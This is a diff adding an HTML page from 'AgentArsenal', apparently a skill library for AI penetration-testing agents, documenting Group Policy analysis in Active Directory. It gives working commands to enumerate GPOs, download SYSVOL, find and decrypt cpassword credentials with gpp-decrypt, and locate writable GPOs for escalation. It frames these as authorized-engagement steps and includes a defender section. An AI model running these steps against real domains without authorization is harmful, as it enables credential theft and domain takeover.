@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: gpo-analysis</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>gpo-analysis</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when analyzing Group Policy Objects for misconfigurations</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ad-enumeration.html">ad-enumeration</a></div><div class="deps"><span class="kind">requires:</span> <a href="ad-enumeration.html">ad-enumeration</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ldap-enumeration.html">ldap-enumeration</a> <a href="bloodhound-methodology.html">bloodhound-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Impacket</td><td>0.11.0</td></tr><tr><td>PowerShell</td><td>7.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Group Policy Objects configure every domain machine, and their files in SYSVOL are readable by all domain users. Old GPOs still carry encrypted (crackable) passwords, and loose GPO permissions let attackers push malicious policy. This skill covers GPO analysis on authorized engagements: enumerating policies, mining SYSVOL, and checking who can modify what.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate all GPOs and their links to OUs.</li>
+<li>Mount or list SYSVOL and walk the Policies directories.</li>
+<li>Search for cpasswords, scripts, and credential material.</li>
+<li>Review GPO permissions: who can edit each policy.</li>
+<li>Map the attack path: writable GPO linked to an OU with valuable</li>
+<p>targets.</p>
+<li>Report credentials found and modification paths separately.</li>
+</ol>
+<h2>1. GPO enumeration</h2>
+<pre><code class="language-powershell"># From a domain-joined host with domain credentials
+Get-GPO -All | Select-Object DisplayName, Id, GpoStatus | head -20
+
+# Which OUs link which GPOs
+Get-GPO -All | ForEach-Object {
+  [xml]$r = Get-GPOReport -Guid $_.Id -ReportType Xml
+  $r.GPO.LinksTo | Select-Object SOMName, SOMPath
+} | head -20
+
+# Who can modify each GPO (the escalation path)
+Get-GPPermissions -Guid &lt;GPO-ID&gt; -All | Select-Object Trustee, Permission</code></pre>
+<p>A GPO editable by a non-admin group and linked to the Domain Controllers OU is a domain-compromise path. Rank GPOs by link target value times editability.</p>
+<h2>2. SYSVOL mining</h2>
+<pre><code class="language-bash"># List the SYSVOL policies share
+smbclient //10.0.5.10/SYSVOL -U &#x27;corp.example\testuser%TestPass123!&#x27; \
+  -c &#x27;recurse; ls Policies/&#x27; 2&gt;/dev/null | head -30
+
+# Download the whole Policies tree for offline grep (it is small)
+smbget -R -U &#x27;corp.example\testuser%TestPass123!&#x27; \
+  smb://10.0.5.10/SYSVOL/corp.example/Policies/ /tmp/sysvol/
+
+# Hunt for cpasswords (old Group Policy Preferences passwords, AES-256
+# encrypted with a PUBLIC key: decryptable with gpp-decrypt)
+grep -ri &#x27;cpassword&#x27; /tmp/sysvol/ 2&gt;/dev/null | head -10
+
+# Scripts and credential material in policy files
+grep -ri -E &#x27;password|passwd|pwd&#x27; /tmp/sysvol/ --include=&#x27;*.xml&#x27; \
+  2&gt;/dev/null | grep -v -i &#x27;policy&#x27; | head -20
+find /tmp/sysvol -name &#x27;*.bat&#x27; -o -name &#x27;*.ps1&#x27; -o -name &#x27;*.vbs&#x27; | head -20</code></pre>
+<p>cpasswords decrypt with the publicly known AES key, which makes them plaintext passwords in practice. Decrypt each one, verify by binding as the account, and handle under credential rules.</p>
+<pre><code class="language-bash"># Decrypt a found cpassword (the key is public knowledge)
+gpp-decrypt &#x27;j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw&#x27;</code></pre>
+<h2>3. Modification rights review</h2>
+<pre><code class="language-bash"># Check GPO DACLs for non-admin edit rights via ldapsearch
+ldapsearch -x -H ldap://10.0.5.10 -D &quot;testuser@corp.example&quot; -w &#x27;TestPass123!&#x27; \
+  -b &quot;CN=Policies,CN=System,dc=corp,dc=example&quot; \
+  &quot;(objectClass=groupPolicyContainer)&quot; displayName 2&gt;/dev/null | head -20
+# Then inspect nTSecurityDescriptor for WriteProperty/WriteDacl grants
+# to groups your user belongs to</code></pre>
+<p>If your user can edit a GPO linked to workstations, you can push a malicious script or scheduled task to those machines. Prove the right exists; only push actual policy changes with explicit approval, since GPO edits affect production machines.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>SYSVOL is huge on old domains. Target the Policies tree only; the</li>
+<p>scripts and staging folders are secondary.</p>
+<li>cpasswords were cleaned long ago. Still check: migrations miss GPOs,</li>
+<p>and one leftover password is enough.</p>
+<li>GPO permissions look fine from your view. Re-check after any</li>
+<p>privilege change; new group memberships open new GPO paths.</p>
+<li>Replication lag hides your test changes. Wait for SYSVOL replication</li>
+<p>or target the PDC emulator directly when verifying.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>A writable GPO is confirmed: document the edit right, the linked OU,</li>
+<p>and the resulting attack path; execute the push only with written approval and a rollback plan.</p>
+<li>Credentials found in SYSVOL: verify, report through the sensitive</li>
+<p>channel, and recommend immediate rotation.</p>
+<li>GPO analysis is clean: note it as positive assurance in the report.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see GPO attacks as policy modifications (event logs on the DC), new scripts appearing in SYSVOL (FIM), and machines suddenly running unexpected startup scripts. cpassword discovery is invisible (read-only SYSVOL access). Defenses are removing all cpasswords, tightening GPO edit permissions to Domain Admins, monitoring GPO version changes, and FIM on SYSVOL.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1484.001 (Domain Policy Modification: Group Policy</li>
+<p>Modification).</p>
+<li>CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).</li>
+<li>Microsoft documentation on Group Policy Preferences (cpassword history).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
